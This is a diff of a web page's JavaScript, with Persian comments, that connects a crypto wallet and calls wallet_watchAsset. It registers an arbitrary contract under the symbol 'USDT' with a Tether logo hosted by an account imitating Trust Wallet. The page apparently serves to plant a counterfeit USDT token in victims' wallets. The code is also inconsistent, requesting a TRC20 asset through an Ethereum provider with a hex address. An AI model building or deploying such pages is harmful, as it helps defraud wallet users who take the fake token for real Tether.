@@ -85,7 +85,8 @@
     </div>
 
     <script>
-        const contractAddress = "TNvrB8QfGowmCNvXYFJuTZQ1DuGNj1eq22";
+        // آدرس هگز پس از تبدیل (جایگزین کن بعد از تبدیل)
+        const contractAddress = "0x8E276b13Efe5a3E664C1B0A98E9F300fB48f93cb"; // مثلاً 41a9d8e... (بعد از تبدیل)
         const logoUrl = "https://raw.githubusercontent.com/Trustwallet000-design/Wallet/refs/heads/main/tether-logo.png";
         const abi = [
             {"stateMutability": "Nonpayable", "type": "Constructor"},
@@ -113,11 +114,10 @@
                     status.innerText = `Wallet Connected! Address: ${address.substring(0, 6)}...${address.slice(-4)}`;
                     status.className = 'show';
 
-                    // تنظیم برای TRC20
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
-                            type: 'TRC20',
+                            type: 'TRC20', // برای شبکه Tron
                             options: {
                                 address: contractAddress,
                                 symbol: 'USDT',
